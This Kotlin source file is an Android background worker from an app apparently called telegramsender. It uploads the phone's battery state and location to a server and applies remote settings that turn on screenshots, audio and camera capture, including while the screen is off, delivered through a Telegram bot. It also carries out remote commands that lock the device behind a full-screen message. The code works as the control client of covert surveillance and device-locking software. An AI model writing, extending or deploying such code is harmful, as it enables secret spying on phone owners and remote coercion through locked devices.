package com.example.telegramsender.worker

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.telegramsender.LockActivity
import com.example.telegramsender.MonitorService
import com.example.telegramsender.data.DevicePreferences
import com.example.telegramsender.network.ApiClient

class SyncWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "SyncWorker"
    }

    override suspend fun doWork(): Result {
        val jwt = DevicePreferences.getDeviceJwt(context)
        if (jwt.isNullOrEmpty()) {
            Log.w(TAG, "Device not registered yet. Skipping sync.")
            return Result.success()
        }

        try {
            // 1. Gather Battery Information
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                context.registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else 100

            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                             status == BatteryManager.BATTERY_STATUS_FULL

            // 2. Gather Location (if permitted)
            var lat: Double? = null
            var lon: Double? = null
            var accuracy: Float? = null

            val hasFine = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val hasCoarse = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

            if (hasFine || hasCoarse) {
                try {
                    val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
                    if (lm != null) {
                        var bestLocation: Location? = null
                        for (provider in lm.getProviders(true)) {
                            val l = lm.getLastKnownLocation(provider) ?: continue
                            if (bestLocation == null || l.accuracy < bestLocation.accuracy) {
                                bestLocation = l
                            }
                        }
                        if (bestLocation != null) {
                            lat = bestLocation.latitude
                            lon = bestLocation.longitude
                            accuracy = bestLocation.accuracy
                        }
                    }
                } catch (e: SecurityException) {
                    Log.w(TAG, "Location permission missing or disabled", e)
                }
            }

            // 3. Pop previously executed commands to acknowledge
            val executedIds = DevicePreferences.getAndClearExecutedCommands(context)

            // 4. Send Unified Heartbeat
            val result = ApiClient.syncDevice(
                deviceJwt = jwt,
                batteryLevel = batteryPct,
                isCharging = isCharging,
                latitude = lat,
                longitude = lon,
                accuracy = accuracy,
                executedCommandIds = executedIds
            )

            if (!result.success) {
                Log.e(TAG, "Sync failed: ${result.errorMessage}")
                return Result.retry()
            }

            DevicePreferences.setLastSyncTime(context, System.currentTimeMillis())

            // 5. Apply Remote Configuration to App & Services (tg_pref)
            val cfg = result.config
            val tgPref = context.getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
            val editor = tgPref.edit()

            if (cfg.telegramBotToken.isNotEmpty()) {
                editor.putString("token", cfg.telegramBotToken)
            }
            if (cfg.telegramChatId.isNotEmpty()) {
                editor.putString("chatId", cfg.telegramChatId)
            }
            editor.putBoolean("is_monitoring_active", cfg.isMonitoringActive)
            editor.putBoolean("sendScreenshot", cfg.sendScreenshot)
            editor.putLong("screenshotInterval", cfg.screenshotInterval)
            editor.putBoolean("sendLocation", cfg.sendLocation)
            editor.putLong("locationInterval", cfg.locationInterval)
            editor.putBoolean("sendAudio", cfg.sendAudio)
            editor.putLong("audioDuration", cfg.audioDuration)
            editor.putBoolean("audioScreenOff", cfg.audioScreenOff)
            editor.putBoolean("sendCamera", cfg.sendCamera)
            editor.putLong("cameraInterval", cfg.cameraInterval)
            editor.putBoolean("cameraScreenOff", cfg.cameraScreenOff)
            editor.apply()

            // Handle Sync Heartbeat Interval change
            val currentInterval = DevicePreferences.getSyncInterval(context)
            if (cfg.syncIntervalMinutes != currentInterval && cfg.syncIntervalMinutes >= 5) {
                DevicePreferences.setSyncInterval(context, cfg.syncIntervalMinutes)
                SyncScheduler.schedulePeriodicSync(context, cfg.syncIntervalMinutes)
            }

            // 6. Handle Lock State & Pending Commands
            var shouldLock = result.isLocked
            var lockMsg = result.lockMessage

            for (cmd in result.pendingCommands) {
                when (cmd.type) {
                    "LOCK_DEVICE" -> {
                        shouldLock = true
                        val msg = cmd.params?.optString("message")
                        if (!msg.isNullOrEmpty()) lockMsg = msg
                    }
                    "UNLOCK_DEVICE" -> {
                        shouldLock = false
                    }
                    "UPDATE_CONFIG" -> {
                        val interval = cmd.params?.optLong("syncIntervalMinutes", 0L) ?: 0L
                        if (interval >= 5) {
                            DevicePreferences.setSyncInterval(context, interval)
                            SyncScheduler.schedulePeriodicSync(context, interval)
                        }
                    }
                }
                // Queue acknowledgement for next cycle
                DevicePreferences.addExecutedCommand(context, cmd.id)
            }

            DevicePreferences.setLocked(context, shouldLock, lockMsg)

            if (shouldLock) {
                val lockIntent = Intent(context, LockActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                    putExtra("LOCK_MESSAGE", lockMsg)
                }
                context.startActivity(lockIntent)
            }

            // If monitoring is active and credentials are set, ensure MonitorService is active
            if (cfg.isMonitoringActive && (cfg.sendAudio || cfg.sendCamera || cfg.sendLocation)) {
                try {
                    val monitorIntent = Intent(context, MonitorService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(monitorIntent)
                    } else {
                        context.startService(monitorIntent)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Could not start MonitorService from background worker", e)
                }
            }

            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error in SyncWorker", e)
            return Result.retry()
        }
    }
}
